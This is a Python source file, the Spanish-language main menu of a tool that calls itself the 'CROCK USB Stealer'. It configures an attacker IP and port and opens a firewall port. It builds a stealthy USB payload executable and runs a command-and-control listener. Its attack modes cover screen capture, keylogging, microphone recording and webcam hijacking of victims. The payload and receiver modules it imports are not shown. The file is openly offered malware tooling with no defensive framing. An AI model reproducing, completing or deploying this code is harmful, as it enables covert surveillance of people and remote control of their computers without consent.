#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CROCK v1.4 - USB STEALER

import os
import sys
import time
import platform
import ctypes
import subprocess

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Auto-elevate to admin if needed
def request_admin():
    """Solicita permisos de administrador si es necesario"""
    SYSTEM = platform.system()
    
    if SYSTEM == "Windows":
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Solicitando permisos de administrador...")
                # Re-ejecutar el script con admin
                subprocess.run(
                    [sys.executable, __file__] + sys.argv[1:],
                    shell=True,
                    start_new_session=False
                )
                sys.exit(0)
        except Exception as e:
            print(f"[-] Error al solicitar admin: {e}")

from config import (
    ATTACKER_IP,
    ATTACKER_PORT,
    ATTACK_MODE,
    HIDE_CONSOLE,
    AUTO_RECONNECT,
    FPS_LIMIT,
    SCREEN_QUALITY,
    MONITOR_NUMBER,
)
from utils.network import get_local_ip, open_firewall
from utils.stealth import hide_console, show_console, is_admin
from utils.c2_manager import C2Manager
from builder.usb_builder import prepare_usb_interactive
from builder.exe_builder import create_app_launcher
from core.receiver import StreamReceiver

SYSTEM = platform.system()
VERSION = "2.0-PRO"

# Colores ANSI
R = '\033[91m' # Red
G = '\033[92m' # Green
Y = '\033[93m' # Yellow
B = '\033[94m' # Blue
M = '\033[95m' # Magenta
C = '\033[96m' # Cyan
W = '\033[97m' # White
RS = '\033[0m' # Reset
BD = '\033[1m' # Bold

LOGO = f"""{R}{BD}
   ██████╗██████╗  ██████╗  ██████╗██╗  ██╗
  ██╔════╝██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝
  ██║     ██████╔╝██║   ██║██║     █████╔╝ 
  ██║     ██╔══██╗██║   ██║██║     ██╔═██╗ 
  ╚██████╗██║  ██║╚██████╔╝╚██████╗██║  ██╗
   ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝{RS}
    {Y}Advanced USB Stealer & Payload Builder{RS}
                 {M}by EstebanCRO{RS}
"""

def clear_screen():
    os.system('cls' if SYSTEM == "Windows" else 'clear')

def configure_ip(attacker_ip, attacker_port):
    clear_screen()
    print(f"\n{C}{BD}" + "█"*65 + f"{RS}")
    print(f"{C}{BD}  CROCK v{VERSION} - NETWORK CONFIGURATION{RS}")
    print(f"{C}{BD}" + "█"*65 + f"{RS}\n")

    local_ip = get_local_ip()
    print(f"[*] IP local detectada: {Y}{local_ip}{RS}\n")

    nueva_ip = input(f"[*] IP atacante [{G}{attacker_ip}{RS}]: ").strip()
    if nueva_ip:
        attacker_ip = nueva_ip

    nuevo_puerto = input(f"[*] Puerto [{G}{attacker_port}{RS}]: ").strip()
    if nuevo_puerto:
        try:
            attacker_port = int(nuevo_puerto)
        except ValueError:
            print(f"{R}[-] Puerto invalido{RS}")

    print(f"\n[+] IP configurada: {G}{attacker_ip}{RS}")
    print(f"[+] Puerto configurado: {G}{attacker_port}{RS}")

    if input(f"\n[*] Abrir puerto en firewall? ({G}y{RS}/{R}n{RS}): ").lower() == 'y':
        if open_firewall(attacker_port):
            print(f"{G}[+] Puerto abierto en firewall exitosamente{RS}")
        else:
            print(f"{R}[-] Error al abrir puerto en firewall{RS}")

    input("\nPresiona Enter...")
    return attacker_ip, attacker_port

def configure_mode(current_mode):
    clear_screen()
    print(f"\n{M}{BD}" + "█"*65 + f"{RS}")
    print(f"{M}{BD}  CROCK v{VERSION} - SELECT ATTACK MODE{RS}")
    print(f"{M}{BD}" + "█"*65 + f"{RS}\n")
    print(f"    {C}1.{RS} SCREEN      - Captura de pantalla en tiempo real")
    print(f"    {C}2.{RS} KEYLOGGER   - Intercepción de teclado en vivo")
    print(f"    {C}3.{RS} MICROPHONE  - Grabación de entorno ambiental")
    print(f"    {C}4.{RS} CAMERA      - Hijacking de webcam en tiempo real")
    print("")

    choice = input(f"[*] Selecciona el vector ({C}1-4{RS}): ").strip()
    if choice == '1':
        current_mode = "screen"
    elif choice == '2':
        current_mode = "keylogger"
    elif choice == '3':
        current_mode = "microphone"
    elif choice == '4':
        current_mode = "camera"
    else:
        return current_mode

    print(f"\n{G}[+] MODO ACTIVADO: {BD}{current_mode.upper()}{RS}")
    input("\nPresiona Enter...")
    return current_mode

def start_receiver(port, mode, auto_reconnect=True):
    clear_screen()
    print(f"\n{R}{BD}" + "█"*65 + f"{RS}")
    print(f"{R}{BD}  CROCK v{VERSION} - COMMAND & CONTROL LISTENER{RS}")
    print(f"{R}{BD}" + "█"*65 + f"{RS}\n")

    try:
        receiver = StreamReceiver(port, mode, auto_reconnect=auto_reconnect)
        receiver.start()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Listener apagado de forma segura.{RS}")
    except Exception as e:
        print(f"{R}[-] Error crítico en listener: {e}{RS}")
        import traceback
        traceback.print_exc()

def show_menu(attacker_ip, attacker_port, attack_mode):
    clear_screen()
    print(LOGO)
    print(f"{BD}" + "="*65 + f"{RS}")
    print(f"  {BD}MAIN PANEL - PAYLOAD FACTORY & C2 INTERFACE{RS}")
    print(f"{BD}" + "="*65 + f"{RS}")
    print("")
    print(f"    {R}1.{RS}  PREPARAR USB {Y}(EXE Standalone Automático){RS} {R}★{RS}")
    print(f"    {G}2.{RS}  INICIAR LISTENER {Y}(Recibir conexiones){RS}")
    print(f"    {C}3.{RS}  PANEL C&C {Y}(Gestión de sesiones activas){RS}")
    print(f"    {B}4.{RS}  CONFIGURAR RED {Y}(IP/Puerto C2){RS}")
    print(f"    {M}5.{RS}  SELECCIONAR VECTOR {Y}(Modo de ataque){RS}")
    print(f"    {W}6.{RS}  SALIR")
    print("")
    print(f"{BD}" + "-"*65 + f"{RS}")
    print(f"    {BD}TARGET C2:{RS}  {G}{attacker_ip}:{attacker_port}{RS}")
    print(f"    {BD}VECTOR:{RS}     {R}{attack_mode.upper()}{RS}")
    print(f"    {BD}OPTIONS:{RS}    FPS: {Y}{FPS_LIMIT}{RS} | QUALITY: {Y}{SCREEN_QUALITY}%{RS}")
    print(f"    {BD}STEALTH:{RS}    RECONNECT: {G if AUTO_RECONNECT else R}{'YES' if AUTO_RECONNECT else 'NO'}{RS} | HIDE: {G if HIDE_CONSOLE else R}{'YES' if HIDE_CONSOLE else 'NO'}{RS}")
    print(f"{BD}" + "-"*65 + f"{RS}")
    print("")
    print("")

def main():
    # Solicitar admin al iniciar
    request_admin()
    
    attacker_ip = ATTACKER_IP
    attacker_port = ATTACKER_PORT
    attack_mode = ATTACK_MODE
    
    # Verificar que estamos en admin
    if SYSTEM == "Windows":
        if not is_admin():
            print("[!] ADVERTENCIA: No se obtuvieron permisos de administrador")
            print("    Algunas funciones podrían no funcionar correctamente")
            print("    Continuar de todas formas? (y/n): ", end="")
            if input().lower() != 'y':
                return

    while True:
        try:
            show_menu(attacker_ip, attacker_port, attack_mode)
            choice = input("[*] Opcion: ").strip()

            if choice == '1':
                try:
                    show_console()
                    prepare_usb_interactive(
                        attacker_ip,
                        attacker_port,
                        attack_mode,
                        fps=FPS_LIMIT,
                        quality=SCREEN_QUALITY,
                        monitor=MONITOR_NUMBER,
                        hide_console=HIDE_CONSOLE,
                        auto_reconnect=AUTO_RECONNECT,
                    )
                except Exception as e:
                    print(f"\n[-] Error en opción 1: {e}")
                    import traceback
                    traceback.print_exc()
                    input("\nPresiona Enter para continuar...")
                    
            elif choice == '2':
                try:
                    show_console()
                    start_receiver(attacker_port, attack_mode, AUTO_RECONNECT)
                except Exception as e:
                    print(f"\n[-] Error en opción 2: {e}")
                    import traceback
                    traceback.print_exc()
                    input("\nPresiona Enter para continuar...")
                    
            elif choice == '3':
                try:
                    show_console()
                    c2 = C2Manager()
                    c2.show_dashboard()
                except Exception as e:
                    print(f"\n[-] Error en opción 3: {e}")
                    import traceback
                    traceback.print_exc()
                    input("\nPresiona Enter para continuar...")
                    
            elif choice == '4':
                try:
                    show_console()
                    attacker_ip, attacker_port = configure_ip(attacker_ip, attacker_port)
                except Exception as e:
                    print(f"\n[-] Error en opción 4: {e}")
                    input("\nPresiona Enter para continuar...")
                    
            elif choice == '5':
                try:
                    show_console()
                    attack_mode = configure_mode(attack_mode)
                except Exception as e:
                    print(f"\n[-] Error en opción 5: {e}")
                    input("\nPresiona Enter para continuar...")
                    
            elif choice == '6':
                print("\n[+] Saliendo del Proyecto CROCK...")
                break
            else:
                print("[-] Opcion invalida")
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[+] Saliendo...")
            break
        except Exception as e:
            print(f"\n[-] Error: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(2)

if __name__ == "__main__":
    main()
